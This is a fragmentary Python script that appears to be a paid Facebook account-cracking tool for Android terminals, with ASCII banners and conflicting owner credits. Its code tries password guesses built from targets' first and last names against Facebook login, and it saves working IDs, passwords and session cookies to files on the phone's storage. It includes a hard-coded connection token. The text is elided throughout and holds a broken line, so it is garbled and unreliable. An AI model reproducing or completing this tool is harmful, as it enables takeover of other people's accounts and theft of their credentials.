...
logo =                                          """            
 ...
 __          ______         _______   _______    ______  ________  __    __  ________  _______        
|  \        /      \       |       \ |       \  /      \|        \|  \  |  \|        \|       \       
| $$       |  $$$$$$\      | $$$$$$$\| $$$$$$$\|  $$$$$$\\$$$$$$$$| $$  | $$| $$$$$$$$| $$$$$$$\      
| $$ ______| $$___\$$      | $$__/ $$| $$__| $$| $$  | $$  | $$   | $$__| $$| $$__    | $$__| $$      
| $$|      \\$$    \       | $$    $$| $$    $$| $$  | $$  | $$   | $$    $$| $$  \   | $$    $$      
| $$ \$$$$$$_\$$$$$$\      | $$$$$$$\| $$$$$$$\| $$  | $$  | $$   | $$$$$$$$| $$$$$   | $$$$$$$\      
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            L-S BROTHER 
\033[1;37m Facebook:            L-S BROTHER 
\033[1;37m Github  :            SS-LOL
\033[1;37m Version :            0.2 paid
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    oks.append(sid)
                    open('/sdcard/L-S_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [L-S-CP] {sid} | {ps} {S}")
                     cps.append(sid)
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[L-S] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{A} [L-S-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/L-S_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            SAGOR 
\033[1;37m Facebook:            SAGAR SARKAR 
\033[1;37m Github  :            RAJ
\033[1;37m Version :            0.2 paid
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://m.me/j/AbaeoDGTavNQds63/')
        pass frist last fristlast frist123
    elif select =='F':
        os.system('xdg-open https://facebook.com/groups/337326185542906/')
    else:
        print('\n Select valid option ... ')
